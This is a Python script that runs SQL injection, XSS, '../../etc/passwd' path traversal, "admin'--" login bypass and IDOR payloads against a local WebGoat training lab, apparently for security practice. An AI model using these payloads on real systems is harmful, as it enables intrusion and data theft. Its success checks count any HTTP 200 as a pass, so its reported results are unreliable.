"""
WebGoat Automated Testing Script
================================

Automated security testing for WebGoat environment.

Usage:
    python labs/scripts/test_webgoat_local.py
"""

import requests
import json
import time
import re
from datetime import datetime
from pathlib import Path
from typing import Dict, List
from dataclasses import dataclass, asdict

OUTPUT_DIR = Path("D:/password_guesser/results")


@dataclass
class WebGoatTestResult:
    """WebGoat test result."""
    lesson: str
    challenge: str
    success: bool
    payload: str
    response_code: int
    evidence: str


class WebGoatTester:
    """WebGoat automated testing."""

    BASE_URL = "http://localhost:8080/WebGoat"

    def __init__(self):
        self.session = requests.Session()
        self.session.timeout = 10
        self.results: List[WebGoatTestResult] = []
        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

    def register_user(self) -> bool:
        """Register a test user."""
        url = f"{self.BASE_URL}/register.mvc"

        data = {
            "username": f"testuser_{int(time.time())}",
            "password": "password123",
            "matchingPassword": "password123",
            "agree": "agree"
        }

        try:
            response = self.session.post(url, data=data)
            if response.status_code == 200 or "success" in response.text.lower():
                print("[+] User registered successfully")
                return True
        except Exception as e:
            print(f"[-] Registration failed: {e}")

        return False

    def login(self, username: str = "testuser", password: str = "password123") -> bool:
        """Login to WebGoat."""
        url = f"{self.BASE_URL}/login"

        data = {
            "username": username,
            "password": password
        }

        try:
            response = self.session.post(url, data=data)
            if "lesson" in response.text or response.status_code == 200:
                print(f"[+] Login successful: {username}")
                return True
        except Exception as e:
            print(f"[-] Login failed: {e}")

        return False

    def test_sql_injection_intro(self) -> WebGoatTestResult:
        """Test SQL Injection introduction lesson."""
        url = f"{self.BASE_URL}/SqlInjection/attack"

        payload = "SELECT * FROM users"

        try:
            response = self.session.get(url, params={"query": payload})

            success = "success" in response.text.lower() or response.status_code == 200

            return WebGoatTestResult(
                lesson="SQL Injection",
                challenge="Introduction",
                success=success,
                payload=payload,
                response_code=response.status_code,
                evidence="SQL query accepted" if success else "Query rejected"
            )
        except Exception as e:
            return WebGoatTestResult(
                lesson="SQL Injection",
                challenge="Introduction",
                success=False,
                payload=payload,
                response_code=0,
                evidence=str(e)
            )

    def test_xss(self) -> WebGoatTestResult:
        """Test XSS lesson."""
        url = f"{self.BASE_URL}/CrossSiteScripting/attack"

        payload = "<script>alert('XSS')</script>"

        try:
            response = self.session.post(url, data={"payload": payload})

            success = payload in response.text or "success" in response.text.lower()

            return WebGoatTestResult(
                lesson="XSS",
                challenge="Stored XSS",
                success=success,
                payload=payload,
                response_code=response.status_code,
                evidence="Script injected" if success else "Script blocked"
            )
        except Exception as e:
            return WebGoatTestResult(
                lesson="XSS",
                challenge="Stored XSS",
                success=False,
                payload=payload,
                response_code=0,
                evidence=str(e)
            )

    def test_path_traversal(self) -> WebGoatTestResult:
        """Test Path Traversal lesson."""
        url = f"{self.BASE_URL}/PathTraversal/attack"

        payload = "../../etc/passwd"

        try:
            response = self.session.get(url, params={"file": payload})

            success = "root:" in response.text or "success" in response.text.lower()

            return WebGoatTestResult(
                lesson="Path Traversal",
                challenge="Basic",
                success=success,
                payload=payload,
                response_code=response.status_code,
                evidence="File accessed" if success else "Access denied"
            )
        except Exception as e:
            return WebGoatTestResult(
                lesson="Path Traversal",
                challenge="Basic",
                success=False,
                payload=payload,
                response_code=0,
                evidence=str(e)
            )

    def test_authentication_bypass(self) -> WebGoatTestResult:
        """Test Authentication Bypass."""
        url = f"{self.BASE_URL}/AuthenticationBypass/attack"

        payload = "admin'--"

        try:
            response = self.session.post(url, data={"username": payload, "password": "anything"})

            success = "success" in response.text.lower() or "welcome" in response.text.lower()

            return WebGoatTestResult(
                lesson="Authentication Bypass",
                challenge="SQL Bypass",
                success=success,
                payload=payload,
                response_code=response.status_code,
                evidence="Bypass successful" if success else "Bypass failed"
            )
        except Exception as e:
            return WebGoatTestResult(
                lesson="Authentication Bypass",
                challenge="SQL Bypass",
                success=False,
                payload=payload,
                response_code=0,
                evidence=str(e)
            )

    def test_idor(self) -> WebGoatTestResult:
        """Test Insecure Direct Object Reference."""
        url = f"{self.BASE_URL}/IDOR/attack"

        payload = "/users/2"

        try:
            response = self.session.get(url, params={"id": "2"})

            success = response.status_code == 200

            return WebGoatTestResult(
                lesson="IDOR",
                challenge="User Profile",
                success=success,
                payload=payload,
                response_code=response.status_code,
                evidence="Different user data accessed" if success else "Access controlled"
            )
        except Exception as e:
            return WebGoatTestResult(
                lesson="IDOR",
                challenge="User Profile",
                success=False,
                payload=payload,
                response_code=0,
                evidence=str(e)
            )

    def run_all_tests(self) -> Dict:
        """Run all WebGoat tests."""
        print("\n" + "="*60)
        print("  WebGoat Automated Security Testing")
        print("="*60)

        # Try login (skip registration for existing user)
        print("\n[*] Attempting login with default credentials...")
        if not self.login("guest", "guest"):
            print("[*] Trying to register new user...")
            self.register_user()
            self.login()

        print("\n[*] Running security tests...")

        print("[*] Testing SQL Injection...")
        self.results.append(self.test_sql_injection_intro())

        print("[*] Testing XSS...")
        self.results.append(self.test_xss())

        print("[*] Testing Path Traversal...")
        self.results.append(self.test_path_traversal())

        print("[*] Testing Authentication Bypass...")
        self.results.append(self.test_authentication_bypass())

        print("[*] Testing IDOR...")
        self.results.append(self.test_idor())

        # Generate summary
        summary = self._generate_summary()

        # Save results
        self._save_results(summary)

        return summary

    def _generate_summary(self) -> Dict:
        """Generate test summary."""
        total = len(self.results)
        success_count = sum(1 for r in self.results if r.success)
        success_rate = (success_count / total * 100) if total > 0 else 0

        return {
            "timestamp": self.timestamp,
            "environment": "WebGoat 8.2.2",
            "base_url": self.BASE_URL,
            "total_tests": total,
            "successful": success_count,
            "success_rate": round(success_rate, 1),
            "results": [asdict(r) for r in self.results]
        }

    def _save_results(self, summary: Dict):
        """Save results to files."""
        output_file = OUTPUT_DIR / f"webgoat_test_{self.timestamp}.json"

        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(summary, f, indent=2, ensure_ascii=False)

        print(f"\n[+] Results saved: {output_file}")

        # Markdown report
        report_file = OUTPUT_DIR / f"webgoat_test_report_{self.timestamp}.md"
        with open(report_file, 'w', encoding='utf-8') as f:
            f.write("# WebGoat Security Test Report\n\n")
            f.write(f"**Time**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            f.write(f"**Environment**: {summary['environment']}\n\n")
            f.write(f"**Base URL**: {summary['base_url']}\n\n")
            f.write(f"**Success Rate**: {summary['success_rate']}%\n\n")

            f.write("## Test Results\n\n")
            f.write("| Lesson | Challenge | Success | Payload | Evidence |\n")
            f.write("|--------|-----------|---------|---------|----------|\n")

            for r in summary["results"]:
                status = "PASS" if r['success'] else "FAIL"
                f.write(f"| {r['lesson']} | {r['challenge']} | {status} | `{r['payload'][:30]}` | {r['evidence']} |\n")

        print(f"[+] Report saved: {report_file}")


def main():
    """Main entry point."""
    print("Checking WebGoat availability...")

    try:
        response = requests.get("http://localhost:8080/WebGoat", timeout=5)
        if response.status_code == 200:
            print("[+] WebGoat is running")
        else:
            print("[-] WebGoat returned unexpected status")
            return
    except Exception as e:
        print(f"[-] WebGoat not available: {e}")
        print("[*] Start WebGoat first: java -jar webgoat-server-8.2.2.jar")
        return

    tester = WebGoatTester()
    results = tester.run_all_tests()

    print("\n" + "="*60)
    print("  Test Summary")
    print("="*60)
    print(f"Total tests: {results['total_tests']}")
    print(f"Successful: {results['successful']}")
    print(f"Success rate: {results['success_rate']}%")

    for r in results["results"]:
        status = "[+]" if r["success"] else "[-]"
        print(f"{status} {r['lesson']} ({r['challenge']}): {r['evidence']}")


if __name__ == "__main__":
    main()